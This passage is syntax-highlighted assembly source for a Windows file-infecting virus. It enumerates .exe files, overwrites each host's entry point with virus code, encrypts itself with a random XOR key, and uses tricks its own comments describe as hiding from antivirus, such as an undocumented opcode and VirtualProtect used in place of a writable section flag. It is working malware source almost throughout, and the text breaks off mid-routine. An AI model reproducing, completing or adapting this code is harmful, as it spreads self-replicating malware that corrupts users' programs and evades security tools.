                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">tamReturn</span><span class="sc0">

</span><span class="sc5">again2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">          </span><span class="sc1">;copying...</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0"> </span><span class="sc5">next2</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">again2</span><span class="sc0">
</span><span class="sc5">next2</span><span class="sc4">:</span><span class="sc0">
            
</span><span class="sc5">CopyReloc</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPointInFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
            

                </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sizeVir</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;copy host in reloc for recover later...</span><span class="sc0">
</span><span class="sc5">again3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">           
                </span><span class="sc6">jcxz</span><span class="sc0"> </span><span class="sc5">next3</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">again3</span><span class="sc0">
</span><span class="sc5">next3</span><span class="sc4">:</span><span class="sc0">


                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startVir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPointInFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
            
    
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sizeVir</span><span class="sc0">     </span><span class="sc1">;copying...</span><span class="sc0">
</span><span class="sc5">again4</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">          </span><span class="sc1">;overwriting host with virus &gt;:D</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0"> </span><span class="sc5">next4</span><span class="sc0">      
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">again4</span><span class="sc0">
</span><span class="sc5">next4</span><span class="sc4">:</span><span class="sc0">

                
                </span><span class="sc5">sizedecrypt</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">endVir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">decryptz</span><span class="sc0"> 
                            
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">sizedecrypt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sizecrypt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetTickCountz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">cryptaz</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;crypt byte to byte with random key</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cryptaz</span><span class="sc0">                
        
                </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">40000040h</span><span class="sc0"> 
                 </span><span class="sc1">;reloc not discarchable!!</span><span class="sc0">
                 </span><span class="sc1">;i think avs no see this flag ;)</span><span class="sc0">

</span><span class="sc5">CloseHandlesInfectado</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'vz'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> 
        
</span><span class="sc5">CloseView</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MapViewOfFileHand</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFilez</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">CloseMapping</span><span class="sc4">:</span><span class="sc0">   
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CreateFileMappingHand</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CloseHandlez</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CreateFileHand</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CloseHandlez</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Closed</span><span class="sc4">:</span><span class="sc0">     
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NextFile</span><span class="sc0">


</span><span class="sc5">datos</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">kernel32_</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Kernel32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">reloc</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.reloc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">GPA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">files</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">pay</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'This virus is for you,for Lady Marian.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' You are the only girl in the world'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'whose i have in loved and never other girl'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'  could be in my heart so you have been.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
                </span><span class="sc5">paytit</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'     i will not forget you...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ApisNames</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetSystemTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetTickCount'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetVersion'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ExitProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'User32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'sfc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SfcIsFileProtected'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">finAPIS</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">              


</span><span class="sc5">dirApis</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">LoadLibraryAz</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">GetSystemTimez</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">CreateFileAz</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">CreateFileMappingAz</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">MapViewOfFilez</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">CloseHandlez</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">UnmapViewOfFilez</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">FindFirstFileAz</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">FindNextFileAz</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">GetTickCountz</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">GetVersionz</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">SetFileAttributesAz</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">ExitProcessz</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
                </span><span class="sc5">MessageBoxAz</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">SfcIsFileProtectedz</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                    
                
                </span><span class="sc5">CreateFileHand</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">CreateFileMappingHand</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">MapViewOfFileHand</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">EntryPointInFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">handFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">GetProcAddressz</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                

                </span><span class="sc5">Max_Path</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                                
 
                </span><span class="sc5">FILETIME</span><span class="sc0">                </span><span class="sc9">struc</span><span class="sc0">
                </span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">FILETIME</span><span class="sc0">                </span><span class="sc9">ends</span><span class="sc0">

                </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">               </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">WFD_ftCreationTime</span><span class="sc0">      </span><span class="sc5">FILETIME</span><span class="sc0">         </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0">  </span><span class="sc5">FILETIME</span><span class="sc0">         </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0">         </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">               </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">               </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">WFD_dwReserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">               </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">WFD_dwReserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">               </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">WFD_szFileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">Max_Path</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                                    </span><span class="sc9">db</span><span class="sc0">         </span><span class="sc2">03</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc5">SYSTEMTIME</span><span class="sc0">                      </span><span class="sc9">struct</span><span class="sc0">
                </span><span class="sc5">ST_wYear</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">ST_wMonth</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">ST_wDayOfWeek</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">ST_wDay</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">ST_wHour</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">ST_wMinute</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">ST_wSecond</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">ST_wMilliseconds</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">SYSTEMTIME</span><span class="sc0">                      </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc5">SystemTime</span><span class="sc0">        </span><span class="sc5">SYSTEMTIME</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
            
</span><span class="sc5">decryptz</span><span class="sc4">:</span><span class="sc0">   
            
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">SetWritableCode</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">retHost</span><span class="sc4">],</span><span class="sc2">0BCh</span><span class="sc0">    </span><span class="sc1">;encrypted??</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">vir</span><span class="sc0">       </span><span class="sc1">;if no encryted jmp code</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">whatkey</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">retHost</span><span class="sc4">]</span><span class="sc0">   
                </span><span class="sc1">;search the encryption key</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bch</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">keyfound</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">whatkey</span><span class="sc0">
                
</span><span class="sc5">keyfound</span><span class="sc4">:</span><span class="sc0">               
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">retHost</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sizecrypt</span><span class="sc0">
</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0">    
                </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0d6h</span><span class="sc0">  </span><span class="sc1">;setalc,undocumented,antiheuristic,is good today??? </span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">                       
                    </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">decrypt</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">vir</span><span class="sc0">
    
</span><span class="sc1">;SetWritableCode rutine searchs VirtualProtect in kernel export table for calling it</span><span class="sc0">
</span><span class="sc1">;later and do writable virus code memory zone.Why? Virus code is on code section</span><span class="sc0">
</span><span class="sc1">;and if code section flags say writable section,avs will see it and will advise </span><span class="sc0">
</span><span class="sc1">;user that infect file is a posible virus :S so we no set that flag and avs will be</span><span class="sc0">
</span><span class="sc1">;in silent :)</span><span class="sc0">
</span><span class="sc1">;In addition with a few modifications explanated and do up,this rutine will search</span><span class="sc0">
</span><span class="sc1">;getProcAddress so we dont spend bytes in repeat code ;)</span><span class="sc0">

            
</span><span class="sc5">SetWritableCode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">  
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">               
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
            
</span><span class="sc5">VPsearch_kernel</span><span class="sc4">:</span><span class="sc0">  
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">     
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">VPsearch_kernel</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;PE</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">     
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Dir entrys</span><span class="sc0">
                        
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;export table</span><span class="sc0">
                
                </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">

    
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;exported func names</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">         
</span><span class="sc5">VPrepeat</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,[</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">   
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">          </span><span class="sc1">;search GetProcAddress</span><span class="sc0">
</span><span class="sc5">repuse</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VP</span><span class="sc4">]</span><span class="sc0">
